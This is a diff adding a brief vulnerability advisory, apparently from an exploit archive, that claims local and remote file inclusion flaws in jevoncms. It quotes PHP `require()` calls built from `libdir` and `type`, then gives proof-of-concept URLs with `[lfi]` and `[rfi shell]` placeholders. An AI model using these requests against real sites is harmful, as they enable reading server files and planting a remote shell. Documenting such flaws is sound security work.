@@ -1,0 +1,48 @@
+########################################################
+	jevoncms (LFI/RFI) Multiple Vulnerabilities
+########################################################
+
+[+]Title	:	jevoncms (libdir) Multiple Vulnerability
+[+]Version:	-
+[+]Download:	http://sourceforge.net/projects/jevoncms/files/
+[+]Author:	eidelweiss
+[+]Contact:	eidelweiss[at]cyberservices[dot]com	
+
+	[!]Thank`s To: all friends
+
+########################################################
+
+	-=[ Vuln C0de ]=-
+***************************
+[-] jevoncms/php/main/jevoncms.php
+
+$_PHPLIB["libdir"] = "phplib/"; 
+require($_PHPLIB["libdir"] ."template.inc");      /* Disable this, if you are not using templates. */
+require("template/jvc_template.php");
+require("php/main/database/jvc_Database.php");
+
+***************************
+[-] jevoncms/php/main/template/jvc_template.php
+
+if($type!=$lasttype && $type!=''){
+  $path= "php/".$type."/".$type.".php" ;
+ // echo $path;
+  require($path);
+
+***************************
+[-] jevoncms/php/menu/menu.php
+
+//require($_PHPLIB["libdir"] ."template.inc");      /* Disable this, if you are not using templates. */
+
+***************************
+
+	-=[ Proof Of Concept ]=-
+
+
+	http://127.0.0.1/jevoncms/php/main/jevoncms.php?libdir=[lfi]
+
+	http://127.0.0.1/jevoncms/php/main/template/jvc_template.php?path= [rfi shell]
+
+	http://127.0.0.1/jevoncms/php/menu/menu.php?libdir=[lfi]
+
+######################=[E0F]=#############################
